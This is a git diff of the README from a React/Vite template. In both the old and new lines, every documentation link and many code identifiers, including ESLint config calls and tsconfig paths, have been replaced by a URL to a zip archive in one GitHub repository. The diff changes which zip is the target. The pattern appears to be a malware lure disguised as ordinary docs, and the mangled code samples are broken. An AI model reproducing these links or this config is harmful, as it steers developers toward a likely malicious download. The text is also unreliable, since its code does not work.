@@ -4,34 +4,34 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip) uses [Babel](https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip) uses [SWC](https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip) for Fast Refresh
+- [@vitejs/plugin-react](https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip) uses [Babel](https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip) uses [SWC](https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip) for Fast Refresh
 
 ## Expanding the ESLint configuration
 
 If you are developing a production application, we recommend updating the configuration to enable type-aware lint rules:
 
 ```js
-export default https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip([
+export default https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip([
   globalIgnores(['dist']),
   {
     files: ['**/*.{ts,tsx}'],
     extends: [
       // Other configs...
 
-      // Remove https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip and replace with this
-      https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip,
+      // Remove https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip and replace with this
+      https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip,
       // Alternatively, use this for stricter rules
-      https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip,
+      https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip,
       // Optionally, add this for stylistic rules
-      https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip,
+      https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip,
 
       // Other configs...
     ],
     languageOptions: {
       parserOptions: {
-        project: ['https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip', 'https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip'],
-        tsconfigRootDir: https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip,
+        project: ['https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip', 'https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip'],
+        tsconfigRootDir: https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip,
       },
       // other options...
     },
@@ -39,28 +39,28 @@ export default https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/m
 ])
 ```
 
-You can also install [eslint-plugin-react-x](https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip) and [eslint-plugin-react-dom](https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip) for React-specific lint rules:
+You can also install [eslint-plugin-react-x](https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip) and [eslint-plugin-react-dom](https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip) for React-specific lint rules:
 
 ```js
-// https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip
+// https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip
 import reactX from 'eslint-plugin-react-x'
 import reactDom from 'eslint-plugin-react-dom'
 
-export default https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip([
+export default https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip([
   globalIgnores(['dist']),
   {
     files: ['**/*.{ts,tsx}'],
     extends: [
       // Other configs...
       // Enable lint rules for React
-      https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip['recommended-typescript'],
+      https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip['recommended-typescript'],
       // Enable lint rules for React DOM
-      https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip,
+      https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip,
     ],
     languageOptions: {
       parserOptions: {
-        project: ['https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip', 'https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip'],
-        tsconfigRootDir: https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip,
+        project: ['https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip', 'https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip'],
+        tsconfigRootDir: https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip,
       },
       // other options...
     },
